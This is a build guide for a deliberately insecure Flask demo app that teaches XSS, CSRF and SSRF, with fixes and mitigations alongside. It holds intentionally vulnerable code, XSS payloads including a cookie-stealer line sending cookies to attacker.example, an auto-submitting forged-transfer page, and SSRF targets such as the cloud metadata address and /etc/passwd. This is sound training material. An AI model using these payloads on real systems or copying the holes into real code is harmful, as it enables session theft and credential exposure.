# XSS / CSRF / SSRF Demo — Development Steps

## Steps

---

### 1. `requirements.txt` — declare `flask` and `requests` as the only dependencies.

```
flask
requests
```

---

### 2. `app.py` — define all routes: home, XSS reflected/stored, CSRF bank/evil, SSRF fetcher, and an internal secrets endpoint.

```python
from flask import Flask, request, render_template, redirect, url_for
from markupsafe import Markup
import requests as http_requests

app = Flask(__name__)

# In-memory state for demos (resets on server restart)
stored_comments = []
bank_balance = 1000
transfer_log = []

# ---------------------------------------------------------------------------
# Home
# ---------------------------------------------------------------------------

@app.route("/")
def index():
    return render_template("index.html")


# ---------------------------------------------------------------------------
# XSS — Reflected
# ---------------------------------------------------------------------------

@app.route("/xss/reflected")
def xss_reflected():
    # VULNERABLE: user input inserted into HTML without escaping
    name = request.args.get("name", "")
    return render_template("xss_reflected.html", name=Markup(name))


# ---------------------------------------------------------------------------
# XSS — Stored
# ---------------------------------------------------------------------------

@app.route("/xss/stored", methods=["GET", "POST"])
def xss_stored():
    if request.method == "POST":
        comment = request.form.get("comment", "")
        stored_comments.append(comment)  # VULNERABLE: stored without sanitisation
    return render_template("xss_stored.html",
                           comments=[Markup(c) for c in stored_comments])


@app.route("/xss/stored/clear")
def xss_stored_clear():
    stored_comments.clear()
    return redirect(url_for("xss_stored"))


# ---------------------------------------------------------------------------
# CSRF — Victim bank
# ---------------------------------------------------------------------------

@app.route("/csrf/bank", methods=["GET", "POST"])
def csrf_bank():
    global bank_balance
    if request.method == "POST":
        # VULNERABLE: no CSRF token checked
        amount = int(request.form.get("amount", 0))
        recipient = request.form.get("recipient", "Unknown")
        bank_balance -= amount
        transfer_log.append(f"${amount} → {recipient}")
    return render_template("csrf_bank.html",
                           balance=bank_balance,
                           log=transfer_log)


@app.route("/csrf/bank/reset")
def csrf_bank_reset():
    global bank_balance
    bank_balance = 1000
    transfer_log.clear()
    return redirect(url_for("csrf_bank"))


# ---------------------------------------------------------------------------
# CSRF — Attacker page (simulates a malicious third-party site)
# ---------------------------------------------------------------------------

@app.route("/csrf/evil")
def csrf_evil():
    return render_template("csrf_evil.html")


# ---------------------------------------------------------------------------
# SSRF
# ---------------------------------------------------------------------------

# A "secret" internal endpoint the outside world shouldn't reach
@app.route("/internal/secrets")
def internal_secrets():
    return (
        "=== INTERNAL USE ONLY ===\n"
        "DB_HOST=db.internal\n"
        "DB_PASS=hunter2\n"
        "API_KEY=sk-1234567890abcdef\n"
        "ADMIN_TOKEN=eyJhbGci...SUPER_SECRET\n",
        200,
        {"Content-Type": "text/plain"},
    )


@app.route("/ssrf", methods=["GET", "POST"])
def ssrf():
    result = error = fetched_url = None
    if request.method == "POST":
        fetched_url = request.form.get("url", "").strip()
        try:
            # VULNERABLE: server fetches any URL supplied by the user
            resp = http_requests.get(fetched_url, timeout=5)
            result = resp.text[:3000]
        except Exception as exc:
            error = str(exc)
    return render_template("ssrf.html",
                           result=result,
                           error=error,
                           fetched_url=fetched_url)


if __name__ == "__main__":
    app.run(debug=True, port=5000)
```

---

### 3. `templates/base.html` — shared layout with nav bar and dark-theme CSS used by every page.

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>{% block title %}Security Demo{% endblock %}</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; }
    body {
      font-family: monospace;
      background: #1a1a2e;
      color: #e0e0e0;
      margin: 0;
      padding: 0;
    }
    nav {
      background: #16213e;
      padding: 12px 24px;
      display: flex;
      gap: 20px;
      align-items: center;
      border-bottom: 2px solid #0f3460;
    }
    nav a {
      color: #e94560;
      text-decoration: none;
      font-weight: bold;
      font-size: 0.9rem;
    }
    nav a:hover { text-decoration: underline; }
    nav .brand { color: #fff; font-size: 1rem; margin-right: 12px; }
    .container {
      max-width: 860px;
      margin: 40px auto;
      padding: 0 24px;
    }
    h1 { color: #e94560; border-bottom: 1px solid #0f3460; padding-bottom: 8px; }
    h2 { color: #a8dadc; }
    .card {
      background: #16213e;
      border: 1px solid #0f3460;
      border-radius: 6px;
      padding: 20px 24px;
      margin-bottom: 24px;
    }
    .vuln-label {
      display: inline-block;
      background: #e94560;
      color: #fff;
      font-size: 0.75rem;
      padding: 2px 8px;
      border-radius: 3px;
      margin-bottom: 12px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .safe-label {
      display: inline-block;
      background: #2a9d8f;
      color: #fff;
      font-size: 0.75rem;
      padding: 2px 8px;
      border-radius: 3px;
      margin-bottom: 12px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    label { display: block; margin-bottom: 4px; font-size: 0.85rem; color: #a8dadc; }
    input[type=text], input[type=number], textarea {
      background: #0f3460;
      border: 1px solid #e94560;
      color: #e0e0e0;
      padding: 8px 10px;
      border-radius: 4px;
      width: 100%;
      margin-bottom: 12px;
      font-family: monospace;
      font-size: 0.9rem;
    }
    button, .btn {
      background: #e94560;
      color: #fff;
      border: none;
      padding: 8px 18px;
      border-radius: 4px;
      cursor: pointer;
      font-family: monospace;
      font-size: 0.9rem;
      text-decoration: none;
      display: inline-block;
    }
    button:hover, .btn:hover { background: #c73652; }
    .btn-secondary {
      background: #0f3460;
      border: 1px solid #e94560;
    }
    .btn-secondary:hover { background: #1a4a80; }
    code, pre {
      background: #0f3460;
      padding: 2px 6px;
      border-radius: 3px;
      font-size: 0.85rem;
    }
    pre {
      padding: 12px;
      overflow-x: auto;
      border: 1px solid #0f3460;
      white-space: pre-wrap;
      word-break: break-all;
    }
    .info {
      background: #0f3460;
      border-left: 4px solid #a8dadc;
      padding: 10px 14px;
      margin-bottom: 16px;
      font-size: 0.88rem;
      line-height: 1.6;
    }
    .warning {
      background: #3d1a1a;
      border-left: 4px solid #e94560;
      padding: 10px 14px;
      margin-bottom: 16px;
      font-size: 0.88rem;
    }
    .result-box {
      background: #0a0a1a;
      border: 1px solid #0f3460;
      padding: 14px;
      margin-top: 16px;
      max-height: 300px;
      overflow-y: auto;
      white-space: pre-wrap;
      word-break: break-all;
      font-size: 0.82rem;
    }
    ul { padding-left: 20px; line-height: 1.8; }
    .divider { border: none; border-top: 1px solid #0f3460; margin: 24px 0; }
  </style>
</head>
<body>
  <nav>
    <span class="brand">&#x1F512; Security Demos</span>
    <a href="/">Home</a>
    <a href="/xss/reflected">XSS (Reflected)</a>
    <a href="/xss/stored">XSS (Stored)</a>
    <a href="/csrf/bank">CSRF</a>
    <a href="/ssrf">SSRF</a>
  </nav>
  <div class="container">
    {% block content %}{% endblock %}
  </div>
</body>
</html>
```

---

### 4. `templates/index.html` — home page linking to each demo with a one-paragraph description of each vulnerability.

```html
{% extends "base.html" %}
{% block title %}Security Demo — Home{% endblock %}
{% block content %}
<h1>Web Security Demonstrations</h1>
<p>Select a vulnerability below to explore an intentionally insecure demo.</p>

<div class="card">
  <span class="vuln-label">XSS</span>
  <h2>Cross-Site Scripting</h2>
  <p>Attacker-controlled input is rendered as executable HTML/JavaScript inside another user's browser.</p>
  <ul>
    <li><a href="/xss/reflected" style="color:#e94560">Reflected XSS</a> — malicious payload lives in the URL; the server echoes it back immediately.</li>
    <li><a href="/xss/stored" style="color:#e94560">Stored XSS</a> — payload is saved in the database and served to every visitor who loads the page.</li>
  </ul>
  <div class="info">
    Try pasting <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> or <code>&lt;img src=x onerror="alert('XSS')"&gt;</code> into the inputs.
  </div>
</div>

<div class="card">
  <span class="vuln-label">CSRF</span>
  <h2>Cross-Site Request Forgery</h2>
  <p>A malicious page tricks an authenticated user's browser into making an unintended state-changing request to another site.</p>
  <ul>
    <li><a href="/csrf/bank" style="color:#e94560">Victim bank page</a> — a simple transfer form with no CSRF protection.</li>
    <li><a href="/csrf/evil" style="color:#e94560">Attacker's evil page</a> — auto-submits a hidden form to the bank the moment it loads.</li>
  </ul>
  <div class="info">
    Open the bank page first, note your balance, then visit the evil page in the same browser — watch the balance change automatically.
  </div>
</div>

<div class="card">
  <span class="vuln-label">SSRF</span>
  <h2>Server-Side Request Forgery</h2>
  <p>The server is tricked into making HTTP requests on the attacker's behalf, potentially reaching internal services.</p>
  <ul>
    <li><a href="/ssrf" style="color:#e94560">SSRF demo</a> — the server fetches any URL you supply.</li>
    <li>Internal secrets endpoint: <code>/internal/secrets</code> (normally unreachable from outside).</li>
  </ul>
  <div class="info">
    Try fetching <code>http://127.0.0.1:5000/internal/secrets</code> through the SSRF form to access data that should be private.
  </div>
</div>

<div class="warning">
  These pages are <strong>intentionally vulnerable</strong>. Run this app in an isolated environment only. Never expose it to a network.
</div>
{% endblock %}
```

---

### 5. `templates/xss_reflected.html` — form whose `name` param is echoed as raw HTML, plus vulnerable/fixed code snippets.

```html
{% extends "base.html" %}
{% block title %}XSS — Reflected{% endblock %}
{% block content %}
<h1>XSS — Reflected</h1>

<div class="info">
  <strong>How it works:</strong> The server reads a value from the URL query string and writes it directly into the HTML response
  without encoding it. Whatever the browser receives is executed as markup — including <code>&lt;script&gt;</code> tags and event handlers.
</div>

<div class="card">
  <span class="vuln-label">Vulnerable</span>
  <h2>Greet a User</h2>
  <p>Enter a name to be greeted. The name is placed into the page as raw HTML.</p>

  <form method="get" action="/xss/reflected">
    <label for="name">Name</label>
    <input type="text" id="name" name="name"
           value="{{ name }}"
           placeholder='Try: &lt;img src=x onerror="alert(1)"&gt;'>
    <button type="submit">Greet</button>
  </form>

  {% if name %}
  <hr class="divider">
  <p><strong>Server response:</strong></p>
  <!-- VULNERABLE: {{ name }} is rendered as raw HTML via Markup() -->
  <div style="padding:10px; background:#0a0a1a; border:1px solid #e94560; border-radius:4px;">
    Hello, {{ name }}!
  </div>
  {% endif %}
</div>

<div class="card">
  <span class="vuln-label">Vulnerable code</span>
  <pre># app.py
name = request.args.get("name", "")
return render_template("xss_reflected.html", name=Markup(name))  # ← no escaping

&lt;!-- template --&gt;
Hello, {{ name }}!  &lt;!-- rendered as raw HTML --&gt;</pre>

  <span class="safe-label">Fixed version</span>
  <pre># Simply omit Markup() — Jinja2 auto-escapes by default
name = request.args.get("name", "")
return render_template("xss_reflected.html", name=name)

&lt;!-- template (unchanged — Jinja2 escapes {{ name }} automatically) --&gt;
Hello, {{ name }}!</pre>
</div>

<div class="card">
  <h2>Payloads to try</h2>
  <ul>
    <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
    <li><code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code></li>
    <li><code>&lt;svg onload="alert(1)"&gt;</code></li>
    <li><code>&lt;a href="javascript:alert(1)"&gt;Click me&lt;/a&gt;</code></li>
  </ul>
  <p style="font-size:0.85rem; color:#a0a0a0;">
    In a real reflected XSS attack the victim is sent a crafted link — e.g. via phishing email.
    Their browser executes the payload in the context of the trusted site.
  </p>
</div>
{% endblock %}
```

---

### 6. `templates/xss_stored.html` — comment form that saves input unescaped and re-renders it for every visitor.

```html
{% extends "base.html" %}
{% block title %}XSS — Stored{% endblock %}
{% block content %}
<h1>XSS — Stored</h1>

<div class="info">
  <strong>How it works:</strong> User-supplied content is saved to the server's storage and then
  rendered as raw HTML for <em>every</em> visitor who loads the page.
  A single injected payload persists and runs in every victim's browser until it is removed.
</div>

<div class="card">
  <span class="vuln-label">Vulnerable</span>
  <h2>Community Comments</h2>

  <form method="post" action="/xss/stored">
    <label for="comment">Leave a comment</label>
    <textarea id="comment" name="comment" rows="3"
              placeholder='Try: &lt;script&gt;alert("Stored XSS!")&lt;/script&gt;'></textarea>
    <button type="submit">Post</button>
    <a class="btn btn-secondary" href="/xss/stored/clear"
       style="margin-left:8px">Clear all comments</a>
  </form>
</div>

{% if comments %}
<div class="card">
  <h2>Posted Comments</h2>
  {% for comment in comments %}
  <div style="padding:10px; background:#0a0a1a; border:1px solid #0f3460;
              border-radius:4px; margin-bottom:8px;">
    <!-- VULNERABLE: comment inserted as raw HTML -->
    {{ comment }}
  </div>
  {% endfor %}
</div>
{% endif %}

<div class="card">
  <span class="vuln-label">Vulnerable code</span>
  <pre># app.py — comment stored without sanitisation
stored_comments.append(request.form.get("comment", ""))

# template — rendered as raw HTML with Markup()
{{ comment }}  {# comment is a Markup object — bypasses auto-escape #}</pre>

  <span class="safe-label">Fixed version</span>
  <pre># Store the raw string (don't wrap in Markup)
stored_comments.append(request.form.get("comment", ""))

# Template auto-escapes plain strings — no change needed
{{ comment }}  {# now safely escaped #}</pre>
  <p style="font-size:0.85rem; color:#a0a0a0; margin-top:8px;">
    For rich-text input consider a dedicated HTML sanitisation library (e.g. <em>bleach</em>)
    that allows only a safe allow-list of tags.
  </p>
</div>

<div class="card">
  <h2>Payloads to try</h2>
  <ul>
    <li><code>&lt;script&gt;alert('Stored XSS!')&lt;/script&gt;</code></li>
    <li><code>&lt;img src=x onerror="alert('cookie: '+document.cookie)"&gt;</code></li>
    <li><code>&lt;b style="color:red"&gt;I can change the page!&lt;/b&gt;</code></li>
    <li>Cookie-stealer skeleton:
      <code>&lt;script&gt;fetch('http://attacker.example/steal?c='+document.cookie)&lt;/script&gt;</code>
    </li>
  </ul>
</div>
{% endblock %}
```

---

### 7. `templates/csrf_bank.html` — mock bank showing balance and a transfer form with no CSRF token.

```html
{% extends "base.html" %}
{% block title %}CSRF — Victim Bank{% endblock %}
{% block content %}
<h1>CSRF — Victim Bank</h1>

<div class="info">
  <strong>Scenario:</strong> You are logged in to your bank. The transfer form below has
  <em>no CSRF token</em> — any page on the internet can silently submit it on your behalf
  just by loading the attacker's page while you are logged in.
</div>

<div class="card">
  <h2>Account Balance</h2>
  <p style="font-size:2rem; color:{% if balance < 1000 %}#e94560{% else %}#2a9d8f{% endif %}; margin:8px 0;">
    ${{ balance }}
  </p>
  <a class="btn btn-secondary" href="/csrf/bank/reset">Reset to $1,000</a>
</div>

<div class="card">
  <span class="vuln-label">Vulnerable — no CSRF protection</span>
  <h2>Transfer Funds</h2>

  <form method="post" action="/csrf/bank">
    <label for="recipient">Recipient</label>
    <input type="text" id="recipient" name="recipient" value="Alice" placeholder="Recipient name">

    <label for="amount">Amount ($)</label>
    <input type="number" id="amount" name="amount" value="50" min="0">

    <button type="submit">Transfer</button>
  </form>
</div>

{% if log %}
<div class="card">
  <h2>Transfer Log</h2>
  <ul>
    {% for entry in log %}
    <li>{{ entry }}</li>
    {% endfor %}
  </ul>
</div>
{% endif %}

<div class="card">
  <span class="vuln-label">Vulnerable code</span>
  <pre># app.py — processes the POST with no token check
@app.route("/csrf/bank", methods=["GET", "POST"])
def csrf_bank():
    if request.method == "POST":
        amount = int(request.form.get("amount", 0))
        recipient = request.form.get("recipient", "")
        bank_balance -= amount  # ← executed for ANY POST, from ANY origin</pre>

  <span class="safe-label">Fixed version</span>
  <pre># Use Flask-WTF (or itsdangerous) to add a CSRF token
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

# In the template, add the hidden token field:
&lt;input type="hidden" name="csrf_token" value="{{ csrf_token() }}"&gt;

# Every POST now requires a valid, session-bound token.
# Cross-origin forged requests cannot read the token, so they fail.</pre>
</div>

<div class="card">
  <h2>Demo steps</h2>
  <ol style="line-height:2;">
    <li>Note your current balance above.</li>
    <li>In the <strong>same browser</strong>, open the
      <a href="/csrf/evil" style="color:#e94560">attacker's evil page</a>.</li>
    <li>Come back here — your balance will have changed without you clicking anything.</li>
  </ol>
</div>
{% endblock %}
```

---

### 8. `templates/csrf_evil.html` — attacker page that auto-submits a hidden form to the bank on page load.

```html
{% extends "base.html" %}
{% block title %}You Won a Prize! (CSRF attacker page){% endblock %}
{% block content %}
<h1 style="color:#f4a261;">CSRF — Attacker's Page</h1>

<div class="warning">
  <strong>Instructor note:</strong> In a real attack this page would live on a completely different domain
  (e.g. <code>evil-site.example.com</code>). Here it shares the same origin for demo convenience,
  but the attack mechanics are identical — the browser sends the victim's session cookies with any
  cross-origin POST to the target site.
</div>

<!-- =====================================================================
     HIDDEN AUTO-SUBMIT FORM — this is the attack
     The form targets the bank's transfer endpoint.
     The victim never sees it; it submits automatically on page load.
===================================================================== -->
<form id="csrf-form" method="post" action="/csrf/bank"
      style="display:none;" aria-hidden="true">
  <input type="hidden" name="recipient" value="Attacker">
  <input type="hidden" name="amount"    value="500">
</form>

<script>
  // Auto-submit as soon as the page loads — victim clicks nothing
  document.getElementById("csrf-form").submit();
</script>

<!-- Decoy content shown to distract the victim -->
<div class="card" style="text-align:center; border-color:#f4a261;">
  <h2 style="color:#f4a261; font-size:2rem;">&#x1F389; Congratulations!</h2>
  <p style="font-size:1.2rem;">You have been selected as today's lucky winner!</p>
  <p style="color:#a0a0a0;">Please wait while we process your reward&hellip;</p>
  <div style="margin-top:20px; font-size:3rem;">&#x23F3;</div>
</div>

<div class="card">
  <span class="vuln-label">What just happened</span>
  <pre>&lt;!-- Hidden form on the attacker's page --&gt;
&lt;form id="csrf-form" method="post" action="http://bank.example/transfer"
      style="display:none;"&gt;
  &lt;input type="hidden" name="recipient" value="Attacker"&gt;
  &lt;input type="hidden" name="amount"    value="500"&gt;
&lt;/form&gt;

&lt;script&gt;
  // Fires the moment the victim loads this page
  document.getElementById("csrf-form").submit();
&lt;/script&gt;</pre>
  <p>
    The victim's browser automatically attached their <strong>session cookie</strong> to the POST
    request because cookies are sent with same-site requests by default (unless <code>SameSite=Strict/Lax</code>
    is set). The bank had no way to distinguish this forged request from a legitimate one.
  </p>
</div>

<a class="btn" href="/csrf/bank">Check the bank balance &rarr;</a>
{% endblock %}
```

---

### 9. `templates/ssrf.html` — URL input whose value the server fetches verbatim, with suggested internal targets.

```html
{% extends "base.html" %}
{% block title %}SSRF Demo{% endblock %}
{% block content %}
<h1>SSRF — Server-Side Request Forgery</h1>

<div class="info">
  <strong>How it works:</strong> The application accepts a URL from the user and
  <em>the server</em> fetches it. An attacker can supply internal addresses that are
  unreachable from the outside (loopback, cloud metadata endpoints, internal services)
  and read the response through the vulnerable application.
</div>

<div class="card">
  <span class="vuln-label">Vulnerable — unrestricted URL fetch</span>
  <h2>URL Fetcher</h2>
  <p style="font-size:0.85rem; color:#a0a0a0;">
    "Enter a URL and we'll preview it for you!"
  </p>

  <form method="post" action="/ssrf">
    <label for="url">URL to fetch</label>
    <input type="text" id="url" name="url"
           value="{{ fetched_url or '' }}"
           placeholder="http://127.0.0.1:5000/internal/secrets">
    <button type="submit">Fetch</button>
  </form>

  <hr class="divider">
  <p style="margin-bottom:4px; font-size:0.85rem; color:#a8dadc;">Suggested targets:</p>
  <ul style="font-size:0.85rem; line-height:2.2;">
    <li>
      <code>http://127.0.0.1:5000/internal/secrets</code>
      — internal endpoint on this server (unreachable from outside)
    </li>
    <li>
      <code>http://127.0.0.1:5000/</code>
      — the app's own home page, fetched by the server
    </li>
    <li>
      <code>http://169.254.169.254/latest/meta-data/</code>
      — AWS EC2 instance metadata (works on real cloud VMs)
    </li>
    <li>
      <code>file:///etc/passwd</code>
      — local file read (depends on the HTTP library's capabilities)
    </li>
  </ul>
</div>

{% if error %}
<div class="card">
  <span class="vuln-label">Error</span>
  <pre>{{ error }}</pre>
</div>
{% endif %}

{% if result is not none %}
<div class="card">
  <h2>Server fetched: <code>{{ fetched_url }}</code></h2>
  <p style="font-size:0.8rem; color:#a0a0a0;">(first 3 000 characters)</p>
  <div class="result-box">{{ result }}</div>
</div>
{% endif %}

<div class="card">
  <span class="vuln-label">Vulnerable code</span>
  <pre># app.py — fetches any user-supplied URL with no validation
url = request.form.get("url", "").strip()
resp = requests.get(url, timeout=5)   # ← server makes the request
result = resp.text</pre>

  <span class="safe-label">Mitigations</span>
  <pre># 1. Allowlist — only permit specific, known-good hosts
ALLOWED_HOSTS = {"api.example.com", "cdn.example.com"}
from urllib.parse import urlparse
parsed = urlparse(url)
if parsed.hostname not in ALLOWED_HOSTS:
    abort(400, "Host not allowed")

# 2. Block private/loopback ranges with a library like ssrf-filter
#    (pip install ssrf-py) or by resolving the hostname and
#    rejecting RFC-1918 / loopback / link-local addresses.

# 3. Disable redirects to prevent redirect-based bypasses
resp = requests.get(url, allow_redirects=False, timeout=5)

# 4. On cloud: use IMDSv2 (token-gated) and block 169.254.169.254
#    at the network layer.</pre>
</div>
{% endblock %}
```

---

## How to run

```bash
# Install dependencies (Kali / externally-managed Python)
pip install -r requirements.txt --break-system-packages

# Start the dev server
python app.py
```

Open **http://127.0.0.1:5000** in a browser.

## Demo flow

| Vulnerability | Steps |
|---|---|
| Reflected XSS | Visit `/xss/reflected`, enter `<img src=x onerror="alert(1)">` in the name field. |
| Stored XSS | Visit `/xss/stored`, post the same payload — it fires for every subsequent visitor. |
| CSRF | Visit `/csrf/bank` (note balance), then open `/csrf/evil` — balance drops automatically. |
| SSRF | Visit `/ssrf`, fetch `http://127.0.0.1:5000/internal/secrets` to read the server's "private" data. |
